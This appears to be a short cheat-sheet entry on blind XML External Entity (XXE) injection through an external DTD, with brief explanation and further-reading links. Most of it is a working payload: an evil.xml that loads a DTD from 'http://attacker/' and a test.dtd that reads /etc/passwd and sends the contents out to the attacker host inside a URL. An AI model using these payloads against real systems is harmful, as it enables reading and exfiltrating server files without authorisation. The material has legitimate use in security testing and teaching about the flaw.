###XXE via External DTD files

In the off chance that it is not possible to view the result of an XXE, or there is some sort of sanitisation occuring in the process of XXE injections, external DTD files can be used to trigger an exception displaying the returned XXE data.

`evil.xml`

```
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker/test.dtd" >
<foo>&e1;</foo>
```

`test.dtd`

```
<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://attacker/BLAH#%p1;'>">
%p2;
```
Further Reading:
[Original/First Documentation of DTD Attack](http://d.hatena.ne.jp/teracc/20090718#1247918667)
[Bugscollector Link](http://bugscollector.com/tricks/7/)